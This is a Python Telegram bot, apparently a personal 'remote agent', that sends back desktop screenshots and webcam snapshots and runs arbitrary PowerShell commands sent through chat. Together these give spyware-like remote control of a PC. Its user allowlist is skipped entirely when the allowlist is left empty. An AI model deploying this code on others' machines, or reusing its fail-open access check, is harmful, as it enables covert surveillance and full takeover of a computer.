import os
import asyncio
from dotenv import load_dotenv
from PIL import ImageGrab
import psutil
import cv2

from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

load_dotenv()

TELEGRAM_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
ALLOWED_USERS_RAW = os.getenv("ALLOWED_USERS", "")
ALLOWED_USERS = [x.strip() for x in ALLOWED_USERS_RAW.split(",") if x.strip()]

async def execute_system_command(cmd: str) -> str:
    try:
        process = await asyncio.create_subprocess_exec(
            "powershell.exe", "-Command", cmd,
            stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()
        return stdout.decode('utf-8', errors='ignore').strip() or stderr.decode('utf-8', errors='ignore').strip()
    except Exception as e:
        return f"Execution Error: {str(e)}"

async def pc_shot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if ALLOWED_USERS and str(update.effective_user.id) not in ALLOWED_USERS: return
    img_path = "screen.png"
    ImageGrab.grab(all_screens=True).save(img_path, "PNG")
    if os.path.exists(img_path):
        with open(img_path, "rb") as p:
            await update.message.reply_photo(photo=p, caption="🖥️ Desktop Screenshot")
        os.remove(img_path)

async def pc_cam(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if ALLOWED_USERS and str(update.effective_user.id) not in ALLOWED_USERS: return
    cap = cv2.VideoCapture(0)
    if not cap.isOpened(): return await update.message.reply_text("Webcam unavailable.")
    ret, frame = cap.read()
    if ret:
        cv2.imwrite("webcam.jpg", frame)
        with open("webcam.jpg", "rb") as photo:
            await update.message.reply_photo(photo=photo, caption="📷 Webcam Snapshot")
        os.remove("webcam.jpg")
    cap.release()

async def pc_run(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if ALLOWED_USERS and str(update.effective_user.id) not in ALLOWED_USERS: return
    cmd = " ".join(context.args)
    if not cmd: return await update.message.reply_text("Usage: /run <command>")
    res = await execute_system_command(cmd)
    await update.message.reply_text(f"```\n{res[:3700]}\n```")

async def main():
    app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
    app.add_handler(CommandHandler("shot", pc_shot))
    app.add_handler(CommandHandler("cam", pc_cam))
    app.add_handler(CommandHandler("run", pc_run))
    
    print("[+] Local PC Remote Agent active...")
    await app.run_polling()

if __name__ == "__main__":
    asyncio.run(main())
